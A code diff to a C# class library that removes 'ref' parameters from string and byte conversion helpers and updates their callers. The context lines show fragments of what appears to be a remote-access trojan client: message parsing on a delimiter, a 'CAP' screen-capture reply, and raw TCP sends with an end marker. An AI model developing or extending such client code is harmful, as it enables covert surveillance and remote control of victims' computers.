@@ -311,12 +311,12 @@ namespace ClassLibrary1
             }
         }
 
-        public static byte[] GetBytes(ref string S)
+        public static byte[] GetBytes( string S)
         {
             return Encoding.Default.GetBytes(S);
         }
 
-        public static string GetString(ref byte[] B)
+        public static string GetString( byte[] B)
         {
             return Encoding.Default.GetString(B);
         }
@@ -326,7 +326,7 @@ namespace ClassLibrary1
             var list = new List<byte[]>();
             var memoryStream = new MemoryStream();
             var memoryStream2 = new MemoryStream();
-            string[] array = Strings.Split(GetString(ref b), spl, -1, CompareMethod.Binary);
+            string[] array = Strings.Split(GetString( b), spl, -1, CompareMethod.Binary);
             memoryStream.Write(b, 0, array[0].Length);
             checked
             {
@@ -664,7 +664,7 @@ namespace ClassLibrary1
         //handle recived messge
         public static void Ind(byte[] b)
         {
-            string[] array = Strings.Split(GetString(ref b), split, -1, CompareMethod.Binary);
+            string[] array = Strings.Split(GetString( b), split, -1, CompareMethod.Binary);
             checked
             {
                 try
@@ -1346,7 +1346,7 @@ namespace ClassLibrary1
                                                                 graphics.Dispose();
                                                                 var memoryStream = new MemoryStream();
                                                                 string text8 = "CAP" + split;
-                                                                b = GetBytes(ref text8);
+                                                                b = GetBytes( text8);
                                                                 memoryStream.Write(b, 0, b.Length);
                                                                 var memoryStream2 = new MemoryStream();
                                                                 var callbackData = (IntPtr) 0;
@@ -1695,7 +1695,7 @@ namespace ClassLibrary1
                     {
                         var memoryStream = new MemoryStream();
                         memoryStream.Write(b, 0, b.Length);
-                        memoryStream.Write(GetBytes(ref endof), 0, endof.Length);
+                        memoryStream.Write(GetBytes( endof), 0, endof.Length);
                         tcp.Client.Send(memoryStream.ToArray(), 0, checked((int) memoryStream.Length), SocketFlags.None);
                         memoryStream.Dispose();
                         result = true;
@@ -1733,7 +1733,7 @@ namespace ClassLibrary1
 
         public static bool Send(string S)
         {
-            return Sendbytes(GetBytes(ref S));
+            return Sendbytes(GetBytes( S));
         }
 
         public static bool connect()
@@ -1851,7 +1851,7 @@ namespace ClassLibrary1
                                     while (true)
                                     {
                                         byte[] array = MeM.ToArray();
-                                        if (!GetString(ref array).Contains(endof))
+                                        if (!GetString( array).Contains(endof))
                                         {
                                             break;
                                         }
